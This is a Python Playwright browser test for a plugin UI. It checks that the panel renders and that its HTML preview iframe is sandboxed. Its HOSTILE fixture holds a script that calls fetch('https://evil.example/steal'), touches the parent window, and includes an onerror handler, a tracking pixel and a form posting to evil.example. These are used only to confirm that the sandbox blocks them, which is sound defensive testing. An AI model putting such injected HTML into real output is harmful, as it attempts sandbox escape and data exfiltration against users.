#!/usr/bin/env python3
"""
Browser checks for the plugin UI (needs Python Playwright:
  pip install playwright && python -m playwright install chromium).

  npm run test:browser

1. The panel renders on sample data without JS errors (light + dark).
2. The HTML preview iframe is isolated: scripts and event handlers in generated
   HTML don't run, it can't reach the parent, and it makes no network requests
   except public Google Fonts (none at all in offline mode).
3. The panel can still measure the preview (same-origin, no scripts).
"""
import pathlib, sys
from playwright.sync_api import sync_playwright

UI = (pathlib.Path(__file__).resolve().parent.parent / 'devready-plugin' / 'ui.html').as_uri()
HOSTILE = """<!DOCTYPE html><html><head><title>t</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap" rel="stylesheet" />
</head><body>
<div class="root" style="width:300px;height:900px;background:#eee">tall content</div>
<script>window.parent.__pwned = 'script'; fetch('https://evil.example/steal');</script>
<img src="x" onerror="window.parent.__pwned='onerror'">
<img src="https://evil.example/pixel.png">
<form action="https://evil.example/post"><button>go</button></form>
</body></html>"""

failures = []
def check(name, ok, detail=''):
    print(('  \u2713 ' if ok else '  \u2717 ') + name + (('  — ' + detail) if detail else ''))
    if not ok: failures.append(name)

with sync_playwright() as p:
    b = p.chromium.launch()
    print('ui render')
    for scheme in ['light', 'dark']:
        pg = b.new_page(viewport={'width': 480, 'height': 820}, color_scheme=scheme)
        errs = []
        pg.on('pageerror', lambda e: errs.append(str(e)))
        pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000); pg.wait_for_timeout(300)
        n = pg.evaluate("document.querySelectorAll('#main .sec').length")
        check('sample data renders (' + scheme + ')', not errs and n > 8, f'{n} sections, errors: {errs[:2]}')
        pg.close()

    print('preview isolation')
    for online in [True, False]:
        pg = b.new_page(viewport={'width': 480, 'height': 820})
        reqs, errs = [], []
        pg.on('pageerror', lambda e: errs.append(str(e)))
        # Only requests that get past CSP reach the router. Record them, then abort so the
        # test is hermetic. (Chromium reports CSP-blocked loads as 'request' + failure 'csp';
        # those never reach the network, so they are correctly not counted here.)
        def router(route):
            u = route.request.url
            if u.startswith('file:') or u.startswith('data:'): return route.continue_()
            reqs.append(u); route.abort()
        pg.route('**/*', router)
        pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
        pg.evaluate("""([html, online]) => {
            S.demo = false;                       // exercise the real (online/offline) path
            window.send = () => {};               // no Figma host in the browser
            S.data.settings.previewFonts = online ? 'google' : 'off';
            S.code['html-single'] = { files: [{ name: 'x.html', lang: 'html', code: html }], preview: { w: 300, h: 200 }, assets: [], stats: {} };
            S.lang = 'html-css'; S.view = 'preview'; S.cmp = 'preview'; render();
        }""", [HOSTILE, online])
        pg.wait_for_timeout(1500)
        label = 'online' if online else 'offline'
        f = pg.query_selector('#pv-frame')
        check(f'[{label}] iframe is sandboxed without allow-scripts', f is not None and f.get_attribute('sandbox') == 'allow-same-origin', f.get_attribute('sandbox') if f else 'no iframe')
        pwned = pg.evaluate("window.__pwned || null")
        check(f'[{label}] scripts / onerror in generated HTML do not run', pwned is None, str(pwned))
        evil = [u for u in reqs if 'evil.example' in u]
        check(f'[{label}] no requests to other hosts', not evil, ', '.join(evil[:3]))
        g = [u for u in reqs if 'fonts.g' in u]
        if online: check('[online] only public Google Fonts may load', all('fonts.googleapis.com' in u or 'fonts.gstatic.com' in u for u in g), f'{len(g)} font requests')
        else: check('[offline] no Google Fonts requests', not g, ', '.join(g[:2]))
        h = pg.evaluate("parseInt(document.getElementById('pv-frame').style.height)")
        check(f'[{label}] panel can still measure the preview height', h >= 900, f'{h}px')
        check(f'[{label}] no JS errors in the panel', not errs, '; '.join(errs[:2]))
        pg.close()
    b.close()

print('\n' + ('all passed' if not failures else f'{len(failures)} failed'))
sys.exit(1 if failures else 0)
